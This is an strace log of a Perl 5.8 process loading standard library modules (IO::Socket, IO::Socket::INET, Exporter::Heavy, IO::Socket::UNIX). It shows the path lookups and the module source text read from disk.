5352  07:08:43.635695 read(10, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
5352  07:08:43.636270 _llseek(10, 6698, [6698], SEEK_SET) = 0
5352  07:08:43.636289 _llseek(10, 0, [6698], SEEK_CUR) = 0
5352  07:08:43.636313 close(10)         = 0
5352  07:08:43.636333 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636349 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636363 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636377 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636391 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636404 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636418 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636431 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636444 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636457 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636470 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.636484 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
5352  07:08:43.636506 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.636522 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.636534 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.636552 read(10, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
5352  07:08:43.636968 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.636984 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.636998 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.637011 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.637024 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.637037 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.637051 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.637063 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.637077 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.637089 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.637102 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.637116 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.637129 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.637135 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
5352  07:08:43.637158 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.637176 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.637187 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.637206 read(11, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
5352  07:08:43.637968 read(11, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
5352  07:08:43.638343 brk(0x829c000)    = 0x829c000
5352  07:08:43.638754 read(11, "", 4096) = 0
5352  07:08:43.638771 close(11)         = 0
5352  07:08:43.640159 read(10, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
5352  07:08:43.640584 _llseek(10, 6496, [6496], SEEK_SET) = 0
5352  07:08:43.640602 _llseek(10, 0, [6496], SEEK_CUR) = 0
5352  07:08:43.640612 close(10)         = 0
5352  07:08:43.640677 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640694 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640708 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640722 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640736 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640749 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640763 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640775 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640789 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640801 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640814 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.640828 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
5352  07:08:43.640851 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.640867 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.640879 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.640895 brk(0x82bd000)    = 0x82bd000
5352  07:08:43.640912 read(10, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
5352  07:08:43.642046 _llseek(10, 1386, [1386], SEEK_SET) = 0
5352  07:08:43.642082 _llseek(10, 0, [1386], SEEK_CUR) = 0
5352  07:08:43.642109 close(10)         = 0
5352  07:08:43.642168 stat64("/etc/perl/IO/Dir.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642184 stat64("/etc/perl/IO/Dir.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642198 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642211 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642224 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642236 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642250 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642262 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642275 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642287 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642299 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.642312 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
5352  07:08:43.642333 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 10
